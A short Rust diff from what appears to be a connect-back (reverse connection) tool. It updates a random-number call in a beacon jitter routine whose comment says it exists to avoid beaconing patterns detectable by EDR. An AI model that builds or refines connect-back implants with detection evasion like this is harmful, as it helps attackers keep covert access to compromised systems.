@@ -161,7 +161,7 @@ pub async fn run_connect_back_mode(host: &str, port: u16, delay: u64, psk: &str)
         // Jitter: randomize delay to avoid fixed beaconing patterns detectable by EDR
         let jitter_range = delay / 4; // ±25% of base delay
         let jittered_delay = if jitter_range > 0 {
-            let offset = rand::thread_rng().gen_range(0..=jitter_range * 2);
+            let offset = rand::rng().random_range(0..=jitter_range * 2);
             delay.saturating_sub(jitter_range) + offset
         } else {
             delay
